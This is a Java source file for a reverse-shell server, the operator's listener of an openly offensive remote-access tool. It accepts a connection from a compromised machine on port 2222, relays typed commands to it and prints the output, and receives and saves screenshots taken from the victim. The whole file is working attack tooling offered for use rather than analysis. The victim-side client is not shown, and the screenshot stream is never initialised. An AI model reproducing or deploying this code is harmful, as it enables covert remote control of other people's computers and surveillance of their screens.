package obs1d1anc1ph3r.reverseshell.server;

import java.awt.image.BufferedImage;
import java.io.*;
import java.net.*;
import javax.imageio.ImageIO;

public class ReverseShellServer {

    private static final int SERVER_PORT = 2222;
    private ServerSocket serverSocket;
    private Socket clientSocket;
    private BufferedReader in;
    private PrintWriter out;
    private BufferedReader userInput;
    private DataInputStream dataIn;

    public static void main(String[] args) {
        ReverseShellServer server = new ReverseShellServer();
        server.start();
    }

    public void start() {
        try {
            setupServer();
            waitForConnection();
            setupStreams();

            Thread outputReceiver = new Thread(new ResponseHandler(in));
            outputReceiver.start();
            new CommandSender(out, userInput, this).handleShell();

        } catch (IOException e) {
            System.err.println("[ERROR] Server error: " + e.getMessage());
        } finally {
            cleanup();
        }
    }

    private void setupServer() throws IOException {
        serverSocket = new ServerSocket(SERVER_PORT);
        System.out.println("[*] Server is running on port " + SERVER_PORT);
    }

    private void waitForConnection() throws IOException {
        System.out.println("[*] Waiting for incoming connection...");
        clientSocket = serverSocket.accept();
        System.out.println("[+] Connection established with " + clientSocket.getInetAddress());
    }

    private void setupStreams() throws IOException {
        in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));
        out = new PrintWriter(clientSocket.getOutputStream(), true);
        userInput = new BufferedReader(new InputStreamReader(System.in));
    }

    public void receiveScreenshot() {
        try {
            System.out.println("[*] Receiving screenshot...");

            int fileSize = dataIn.readInt();
            byte[] imageBytes = new byte[fileSize];
            dataIn.readFully(imageBytes);

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(imageBytes);
            BufferedImage image = ImageIO.read(byteArrayInputStream);

            File outputFile = new File("screenshot.png");
            ImageIO.write(image, "png", outputFile);
            System.out.println("[+] Screenshot received and saved as " + outputFile.getAbsolutePath());

        } catch (IOException e) {
            System.err.println("[ERROR] Failed to receive screenshot: " + e.getMessage());
        }
    }

    public Socket getClientSocket() {
        return clientSocket;
    }

    private void cleanup() {
        try {
            if (in != null) {
                in.close();
            }
            if (out != null) {
                out.close();
            }
            if (userInput != null) {
                userInput.close();
            }
            if (clientSocket != null) {
                clientSocket.close();
            }
            if (serverSocket != null) {
                serverSocket.close();
            }
        } catch (IOException e) {
            System.err.println("[ERROR] Error closing resources: " + e.getMessage());
        }
    }
}
